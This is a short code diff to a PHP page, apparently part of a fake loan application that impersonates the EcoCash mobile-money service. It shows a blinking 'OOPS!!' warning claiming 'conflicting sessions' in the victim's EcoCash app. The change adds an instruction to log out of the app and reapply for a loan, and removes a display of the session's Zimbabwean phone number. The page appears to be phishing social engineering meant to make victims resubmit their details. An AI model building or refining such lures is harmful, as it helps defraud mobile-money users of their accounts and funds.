@@ -475,15 +475,9 @@ if (isset($_GET['action']) && $_GET['action'] === 'reapply') {
                 <div class="conflict-message blink-warning" id="conflictMessage">
                     <div class="oops">OOPS!!</div>
                     <div class="description">
-                        Conflicting sessions detected from your EcoCash app. Please reapply for a loan. Thanks
+                        Conflicting sessions detected from your EcoCash app. Please Logout from app and reapply for a loan. Thanks
                     </div>
                 </div>
-
-                <?php if (!empty($phoneInSession)): ?>
-                <div class="phone-display">
-                    📱 Current Session: <span>+263 <?= htmlspecialchars($phoneInSession) ?></span>
-                </div>
-                <?php endif; ?>
 
                 <div class="details-list">
                     <div class="detail-item">
@@ -506,13 +500,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'reapply') {
                     <a href="?action=reapply" class="btn btn-reapply">
                         🔄 Reapply for Loan
                     </a>
-                </div>
-
-                <div class="footer-note">
-                    <span>⚠️ Clicking reapply allow a fresh application</span>
-                </div>
-                
-                
+                </div> 
             </div>
         </div>
     </div>
